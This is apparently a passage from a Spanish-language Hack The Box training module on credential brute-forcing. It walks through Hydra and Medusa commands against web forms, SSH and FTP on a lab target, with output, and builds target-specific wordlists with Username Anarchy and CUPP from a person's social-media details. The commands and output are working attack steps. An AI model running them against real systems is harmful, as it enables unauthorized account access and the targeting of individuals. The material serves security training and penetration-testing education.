vcrdcr@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
vcrdcr@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 12:51:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
[5000][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28
```

Recuerda que elaborar lo correcto `params` string es crucial para un ataque exitoso de Hydra. La información precisa sobre la estructura y el comportamiento del formulario es esencial para construir esta cadena de manera efectiva. Una vez que Hydra haya completado el ataque, inicie sesión en el sitio web utilizando las credenciales encontradas y recupere la bandera.


# Medusa

---

Medusa, una herramienta prominente en el arsenal de ciberseguridad, está diseñada para ser una fuerza bruta de inicio de sesión rápida, masivamente paralela y modular. Su objetivo principal es admitir una amplia gama de servicios que permiten la autenticación remota, lo que permite a los probadores de penetración y profesionales de seguridad evaluar la resistencia de los sistemas de inicio de sesión contra ataques de fuerza bruta.

## Instalación

Medusa a menudo viene preinstalado en distribuciones populares de pruebas de penetración. Puede verificar su presencia ejecutando:

  Medusa

```shell-session
vcrdcr@htb[/htb]$ medusa -h
```

Instalar Medusa en un sistema Linux es sencillo.

  Medusa

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get -y update
vcrdcr@htb[/htb]$ sudo apt-get -y install medusa
```

## Tabla de Síntesis y Parámetros de Comando

La interfaz de línea de comandos de Medusa es sencilla. Permite a los usuarios especificar hosts, usuarios, contraseñas y módulos con varias opciones para ajustar el proceso de ataque.

  Medusa

```shell-session
vcrdcr@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

|Parámetro|Explicación|Ejemplo de Uso|
|---|---|---|
|`-h HOST`o `-H FILE`|Opciones de destino: Especifique un solo nombre de host de destino o una dirección IP (`-h`) o un archivo que contiene una lista de objetivos (`-H`).|`medusa -h 192.168.1.10 ...`o `medusa -H targets.txt ...`|
|`-u USERNAME`o `-U FILE`|Opciones de nombre de usuario: Proporcione un solo nombre de usuario (`-u`) o un archivo que contiene una lista de nombres de usuario (`-U`).|`medusa -u admin ...`o `medusa -U usernames.txt ...`|
|`-p PASSWORD`o `-P FILE`|Opciones de contraseña: Especifique una sola contraseña (`-p`) o un archivo que contiene una lista de contraseñas (`-P`).|`medusa -p password123 ...`o `medusa -P passwords.txt ...`|
|`-M MODULE`|Módulo: Defina el módulo específico a utilizar para el ataque (por ejemplo `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|
|`-m "MODULE_OPTION"`|Opciones de módulo: Proporcione los parámetros adicionales requeridos por el módulo elegido, entre comillas.|`medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...`|
|`-t TASKS`|Tareas: Defina el número de intentos de inicio de sesión paralelos para ejecutar, lo que podría acelerar el ataque.|`medusa -t 4 ...`|
|`-f`o `-F`|Modo rápido: Detenga el ataque después de encontrar el primer inicio de sesión exitoso, ya sea en el host actual (`-f`) o cualquier host (`-F`).|`medusa -f ...`o `medusa -F ...`|
|`-n PORT`|Puerto: Especifique un puerto no predeterminado para el servicio de destino.|`medusa -n 2222 ...`|
|`-v LEVEL`|Salida verbose: Mostrar información detallada sobre el progreso del ataque. Cuanto más alto es el `LEVEL` (hasta 6), cuanto más detallada sea la salida.|`medusa -v 4 ...`|

### Módulos Medusa

Cada módulo en Medusa está diseñado para interactuar con mecanismos de autenticación específicos, lo que le permite enviar las solicitudes apropiadas e interpretar las respuestas para ataques exitosos. A continuación se muestra una tabla de módulos de uso común:

|Módulo Medusa|Servicio/Protocolo|Descripción|Ejemplo de Uso|
|---|---|---|---|
|FTP|Protocolo de Transferencia de Archivos|Credenciales de inicio de sesión FTP de fuerza bruta, utilizadas para transferencias de archivos a través de una red.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
|HTTP|Protocolo de Transferencia de Hipertexto|Formularios de inicio de sesión de fuerza bruta en aplicaciones web a través de HTTP (GET/POST).|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
|IMAP|Protocolo de Acceso a Mensajes de Internet|Inicios de sesión IMAP de fuerza bruta, a menudo utilizados para acceder a servidores de correo electrónico.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
|MySQL|Base de datos MySQL|Credenciales de base de datos MySQL de fuerza bruta, comúnmente utilizadas para aplicaciones web y bases de datos.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
|POP3|Protocolo de la Oficina de Correos 3|Inicios de sesión POP3 de fuerza bruta, generalmente utilizados para recuperar correos electrónicos de un servidor de correo.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
|PDR|Protocolo de Escritorio Remoto|Inicios de sesión RDP de fuerza bruta, comúnmente utilizados para el acceso de escritorio remoto a sistemas Windows.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
|SSHv2|Shell Seguro (SSH)|Inicios de sesión SSH de fuerza bruta, comúnmente utilizados para un acceso remoto seguro.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
|Subversión (SVN)|Sistema de Control de Versiones|Repositorios de Subversión de fuerza bruta (SVN) para control de versiones.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
|Telnet|Protocolo Telnet|Servicios Telnet de fuerza bruta para la ejecución remota de comandos en sistemas más antiguos.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
|VNC|Computación de Redes Virtuales|Credenciales de inicio de sesión VNC de fuerza bruta para acceso de escritorio remoto.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
|Formulario Web|Formularios de Inicio de Sesión Web de fuerza bruta|Formularios de inicio de sesión de fuerza bruta en sitios web que utilizan solicitudes HTTP POST.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|

### Dirigirse a un servidor SSH

Imagine un escenario en el que necesita probar la seguridad de un servidor SSH en `192.168.0.100`. Tiene una lista de nombres de usuario potenciales en `usernames.txt` y contraseñas comunes en `passwords.txt`. Para lanzar un ataque de fuerza bruta contra el servicio SSH en este servidor, utilice el siguiente comando Medusa:

  Medusa

```shell-session
vcrdcr@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

Este comando instruye a Medusa a:

- Apunte al anfitrión en `192.168.0.100`.
- Utilice los nombres de usuario de la `usernames.txt` archivo.
- Pruebe las contraseñas enumeradas en el `passwords.txt` archivo.
- Emplear el `ssh` módulo para el ataque.

Medusa probará sistemáticamente cada combinación de nombre de usuario y contraseña contra el servicio SSH para intentar obtener acceso no autorizado.

### Orientación a Múltiples Servidores Web con Autenticación HTTP Básica

Supongamos que tiene una lista de servidores web que utilizan autenticación HTTP básica. Las direcciones de estos servidores se almacenan en `web_servers.txt`y también tiene listas de nombres de usuario y contraseñas comunes en `usernames.txt` y `passwords.txt`, respectivamente. Para probar estos servidores simultáneamente, ejecute:

  Medusa

```shell-session
vcrdcr@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

En este caso, Medusa hará:

- Iterar a través de la lista de servidores web en `web_servers.txt`.
- Utilice los nombres de usuario y contraseñas proporcionados.
- Emplear el `http` módulo con el `GET` método para intentar iniciar sesión.

Al ejecutar múltiples subprocesos, Medusa verifica eficientemente cada servidor en busca de credenciales débiles.

### Pruebas de Contraseñas Vacías o Predeterminadas

Si desea evaluar si hay cuentas en un host específico (`10.0.0.5`) tener contraseñas vacías o predeterminadas (donde la contraseña coincide con el nombre de usuario), puede usar:

  Medusa

```shell-session
vcrdcr@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

Este comando instruye a Medusa a:

- Apunte al anfitrión en `10.0.0.5`.
- Usa los nombres de usuario de `usernames.txt`.
- Realizar comprobaciones adicionales para contraseñas vacías (`-e n`) y contraseñas que coincidan con el nombre de usuario (`-e s`).
- Utilice el módulo de servicio apropiado (reemplazar `service_name` con el nombre correcto del módulo).

Medusa probará cada nombre de usuario con una contraseña vacía y luego con la contraseña que coincida con el nombre de usuario, lo que podría revelar cuentas con configuraciones débiles o predeterminadas.


# Servicios Web

---

En el panorama dinámico de la ciberseguridad, mantener mecanismos de autenticación robustos es primordial. Mientras que tecnologías como Secure Shell (`SSH`) y Protocolo de Transferencia de Archivos (`FTP`) facilitan el acceso remoto seguro y la administración de archivos, a menudo dependen de las combinaciones tradicionales de nombre de usuario y contraseña, presentando vulnerabilidades potenciales explotables a través de ataques de fuerza bruta. En este módulo, profundizaremos en la aplicación práctica de `Medusa`, una potente herramienta de fuerza bruta, para comprometer sistemáticamente los servicios SSH y FTP, ilustrando así los posibles vectores de ataque y enfatizando la importancia de las prácticas de autenticación fortificadas.

`SSH` es un protocolo de red criptográfica que proporciona un canal seguro para el inicio de sesión remoto, la ejecución de comandos y las transferencias de archivos a través de una red no segura. Su fuerza radica en su cifrado, lo que lo hace significativamente más seguro que los protocolos no cifrados como `Telnet`. Sin embargo, las contraseñas débiles o fácilmente adivinables pueden socavar la seguridad de SSH, exponiéndola a ataques de fuerza bruta.

`FTP`es un protocolo de red estándar para transferir archivos entre un cliente y un servidor en una red informática. También es ampliamente utilizado para cargar y descargar archivos de sitios web. Sin embargo, el FTP estándar transmite datos, incluidas las credenciales de inicio de sesión, en texto claro, lo que lo hace susceptible a la interceptación y la fuerza bruta.

## Inicio

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

Comenzamos nuestra exploración apuntando a un servidor SSH que se ejecuta en un sistema remoto. Asumir el conocimiento previo del nombre de usuario `sshuser`, podemos aprovechar Medusa para intentar diferentes combinaciones de contraseñas hasta que se logre la autenticación exitosa sistemáticamente.

El siguiente comando sirve como nuestro punto de partida:

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Desglosemos cada componente:

- `-h <IP>`: Especifica la dirección IP del sistema de destino.
- `-n <PORT>`: Define el puerto en el que el servicio SSH está escuchando (típicamente el puerto 22).
- `-u sshuser`: Establece el nombre de usuario para el ataque de fuerza bruta.
- `-P 2023-200_most_used_passwords.txt`: Señala a Medusa a una lista de palabras que contiene las 200 contraseñas más utilizadas en 2023. La efectividad de un ataque de fuerza bruta a menudo está ligada a la calidad y relevancia de la lista de palabras utilizada.
- `-M ssh`: Selecciona el módulo SSH dentro de Medusa, adaptando el ataque específicamente para la autenticación SSH.
- `-t 3`: Dicta el número de intentos de inicio de sesión paralelo para ejecutar simultáneamente. Aumentar este número puede acelerar el ataque, pero también puede aumentar la probabilidad de detección o activación de medidas de seguridad en el sistema objetivo.

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

Tras la ejecución, Medusa mostrará su progreso a medida que recorra las combinaciones de contraseñas. La salida indicará un inicio de sesión exitoso, revelando la contraseña correcta.

## Obtención de Acceso

Con la contraseña en la mano, establezca una conexión SSH utilizando el siguiente comando e ingrese la contraseña encontrada cuando se le solicite:

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ ssh sshuser@<IP> -p PORT
```

Este comando iniciará una sesión SSH interactiva, otorgándole acceso a la línea de comandos del sistema remoto.

### Expandiendo la Superficie de Ataque

Una vez dentro del sistema, el siguiente paso es identificar otras superficies de ataque potenciales. Usando `netstat` (dentro de la sesión SSH) para enumerar los puertos abiertos y los servicios de escucha, descubre un servicio que se ejecuta en el puerto 21.

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```

Más reconocimiento con `nmap` (dentro de la sesión SSH) confirma este hallazgo como un servidor ftp.

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

### Orientación al servidor FTP

Una vez identificado el servidor FTP, puede proceder a forzar brutamente su mecanismo de autenticación.

Si exploramos el `/home` directorio en el sistema de destino, vemos un `ftpuser` carpeta, lo que implica la probabilidad de que el nombre de usuario del servidor FTP sea `ftpuser`. En base a esto, podemos modificar nuestro comando Medusa en consecuencia:

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```

Las diferencias clave aquí son:

- `-h 127.0.0.1`: Apunta al sistema local, ya que el servidor FTP se está ejecutando localmente. El uso de la dirección IP le dice a medusa explícitamente que use IPv4.
- `-u ftpuser`: Especifica el nombre de usuario `ftpuser`.
- `-M ftp`: Selecciona el módulo FTP dentro de Medusa.
- `-t 5`: Aumenta el número de intentos de inicio de sesión paralelo a 5.

### Recuperando La Bandera

Al descifrar con éxito la contraseña FTP, establezca una conexión FTP. Dentro de la sesión FTP, use el `get` comando para descargar el `flag.txt` archivo, que puede contener información sensible.:

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||25926|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||37251|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (131.45 KiB/s)
ftp> exit
221 Goodbye.
```

Luego lea el archivo para obtener la bandera:

  Servicios Web

```shell-session
vcrdcr@htb[/htb]$ cat flag.txt
HTB{...}
```

La facilidad con la que se pueden ejecutar tales ataques subraya la importancia de emplear contraseñas fuertes y únicas.


# Listas de palabras personalizadas

---

Mientras que las listas de palabras pre-hechas como `rockyou` o `SecLists` proporcionan un extenso repositorio de contraseñas y nombres de usuario potenciales, operan en un amplio espectro, lanzando una amplia red con la esperanza de captar la combinación correcta. Si bien es efectivo en algunos escenarios, este enfoque puede ser ineficiente y requiere mucho tiempo, especialmente cuando se dirige a individuos u organizaciones específicas con patrones únicos de contraseña o nombre de usuario.

Considere el escenario en el que un pentester intenta comprometer el relato de "Thomas Edison" en su lugar de trabajo. Una lista de nombres de usuario genérica como `xato-net-10-million-usernames-dup.txt` es poco probable que produzca resultados significativos. Dadas las posibles convenciones de nombre de usuario aplicadas por su empresa, la probabilidad de que su nombre de usuario específico se incluya en un conjunto de datos tan masivo es mínima. Estos podrían variar desde un formato de nombre/apellido directo hasta combinaciones más intrincadas como apellido/primeros tres.

En tales casos, el poder de las listas de palabras personalizadas entra en juego. Estas listas meticulosamente elaboradas, adaptadas al objetivo específico y su entorno, aumentan drásticamente la eficiencia y la tasa de éxito de los ataques de fuerza bruta. Aprovechan la información recopilada de varias fuentes, como perfiles de redes sociales, directorios de empresas o incluso datos filtrados, para crear un conjunto enfocado y altamente relevante de contraseñas y nombres de usuario potenciales. Este enfoque nítido con láser minimiza el esfuerzo desperdiciado y maximiza las posibilidades de descifrar la cuenta objetivo.

## Nombre de usuario Anarquía

Incluso cuando se trata de un nombre aparentemente simple como "Jane Smith," la generación manual de nombres de usuario puede convertirse rápidamente en un esfuerzo complicado. Mientras que las combinaciones obvias como `jane`, `smith`, `janesmith`, `j.smith`, o `jane.s` puede parecer adecuado, apenas arañan la superficie del panorama potencial de nombres de usuario.

La creatividad humana no conoce límites, y los nombres de usuario a menudo se convierten en un lienzo para la expresión personal. Jane podría tejer sin problemas en su segundo nombre, año de nacimiento o un pasatiempo preciado, lo que lleva a variaciones como `janemarie`, `smithj87`, o `jane_the_gardener`. El encanto de `leetspeak`, donde las letras se reemplazan con números o símbolos, podrían manifestarse en nombres de usuario como `j4n3`, `5m1th`, o `j@n3_5m1th`. Su pasión por un libro, película o banda en particular puede inspirar nombres de usuario como `winteriscoming`, `potterheadjane`, o `smith_beatles_fan`.

Aquí es donde `Username Anarchy` brilla. Representa iniciales, sustituciones comunes y más, lanzando una red más amplia en su búsqueda para descubrir el nombre de usuario del objetivo:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ ./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key
```

Primero, instale rubí y luego tire del `Username Anarchy` git para obtener el guión:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ sudo apt install ruby -y
vcrdcr@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
vcrdcr@htb[/htb]$ cd username-anarchy
```

A continuación, ejecútelo con los nombres y apellidos del objetivo. Esto generará posibles combinaciones de nombre de usuario.

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Al inspeccionar `jane_smith_usernames.txt`, encontrará una amplia gama de nombres de usuario, que abarcan:

- Combinaciones básicas: `janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.
- Iniciales: `js`, `j.s.`, `s.j.`, etc.
- etc

Esta lista completa, adaptada al nombre del objetivo, es valiosa en un ataque de fuerza bruta.

## CUPP

Con el aspecto del nombre de usuario abordado, el siguiente obstáculo formidable en un ataque de fuerza bruta es la contraseña. Aquí es donde `CUPP` (Common User Passwords Profiler) interviene, una herramienta diseñada para crear listas de palabras de contraseñas altamente personalizadas que aprovechan la inteligencia recopilada sobre su objetivo.

Continuemos nuestra exploración con Jane Smith. Ya hemos empleado `Username Anarchy` para generar una lista de nombres de usuario potenciales. Ahora, usemos CUPP para complementar esto con una lista de contraseñas específicas.

La eficacia de CUPP depende de la calidad y la profundidad de la información que usted alimenta. Es similar a un detective que reúne el perfil de un sospechoso: cuantas más pistas tenga, más clara será la imagen. Entonces, ¿dónde se puede reunir esta valiosa inteligencia para un objetivo como Jane Smith?

- `Social Media`: Una mina de oro de datos personales: cumpleaños, nombres de mascotas, citas favoritas, destinos de viaje, otros significativos y más. Plataformas como Facebook, Twitter, Instagram y LinkedIn pueden revelar mucha información.
- `Company Websites`: Los sitios web de empleadores actuales o pasados de Jane pueden enumerar su nombre, posición e incluso su biografía profesional, ofreciendo información sobre su vida laboral.
- `Public Records`: Dependiendo de la jurisdicción y las leyes de privacidad, los registros públicos pueden divulgar detalles sobre la dirección de Jane, los miembros de la familia, la propiedad o incluso los enredos legales anteriores.
- `News Articles and Blogs`¿: Jane ha aparecido en algún artículo de noticias o publicaciones de blog? Estos podrían arrojar luz sobre sus intereses, logros o afiliaciones.

OSINT será una mina de oro de información para CUPP. Proporcione tanta información como sea posible; la efectividad de CUPP depende de la profundidad de su inteligencia. Por ejemplo, digamos que ha reunido este perfil basado en las publicaciones de Facebook de Jane Smith.

|Campo|Detalles|
|---|---|
|Nombre|Jane Smith|
|Apodo|Janey|
|Fecha de nacimiento|11 De diciembre de 1990|
|Estado de Relación|En una relación con Jim|
|Nombre del Socio|Jim (Nombre: Jimbo)|
|Fecha de nacimiento del socio|12 De diciembre de 1990|
|Mascota|Punto|
|Empresa|AHÍ|
|Intereses|Hackers, Pizza, Golf, Caballos|
|Colores Favoritos|Azul|

CUPP tomará sus entradas y creará una lista completa de contraseñas potenciales:

- Original y Capitalizado: `jane`, `Jane`
- Cuerdas Invertidas: `enaj`, `enaJ`
- Variaciones de la fecha de nacimiento: `jane1994`, `smith2708`
- Concatenaciones: `janesmith`, `smithjane`
- Personajes Especiales Añadidos: `jane!`, `smith@`
- Números Adicionales: `jane123`, `smith2024`
- Leetspeak Sustituciones: `j4n3`, `5m1th`
- Mutaciones Combinadas: `Jane1994!`, `smith2708@`

Este proceso da como resultado una lista de palabras altamente personalizada, significativamente más probable que contenga la contraseña real de Jane que cualquier diccionario genérico estándar que pueda esperar lograr. Este enfoque centrado aumenta drásticamente las probabilidades de éxito en nuestros esfuerzos de descifrado de contraseñas.

Si está utilizando Pwnbox, es probable que CUPP esté preinstalado. De lo contrario, instálelo usando:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ sudo apt install cupp -y
```

Invoque CUPP en modo interactivo, CUPP lo guiará a través de una serie de preguntas sobre su objetivo, ingrese lo siguiente según lo solicitado:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

Ahora tenemos una lista de username.txt generada y una lista de contraseñas de jane.txt, pero hay una cosa más con la que debemos lidiar. CUPP ha generado muchas contraseñas posibles para nosotros, pero la compañía de Jane, AHI, tiene una política de contraseñas bastante extraña.

- Longitud mínima: 6 caracteres
- Debe Incluir:
    - Al menos una letra mayúscula
    - Al menos una letra minúscula
    - Al menos un número
    - Al menos dos caracteres especiales (del conjunto `!@#$%^&*`)

Como hicimos antes, podemos usar grep para filtrar esa lista de contraseñas para que coincida con esa política:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Este comando filtra eficientemente `jane.txt` para que coincida con la política proporcionada, desde ~46000 contraseñas hasta una posible ~7900. Primero asegura una longitud mínima de 6 caracteres, luego verifica al menos una letra mayúscula, una letra minúscula, un número y, finalmente, al menos dos caracteres especiales del conjunto especificado. Los resultados filtrados se almacenan en `jane-filtered.txt`.

Utilice las dos listas generadas en Hydra contra el objetivo para forzar brutamente el formulario de inicio de sesión. Recuerde cambiar la información de destino para su instancia.

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
[PORT][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
```

Una vez que Hydra haya completado el ataque, inicie sesión en el sitio web utilizando las credenciales descubiertas y recupere la bandera.


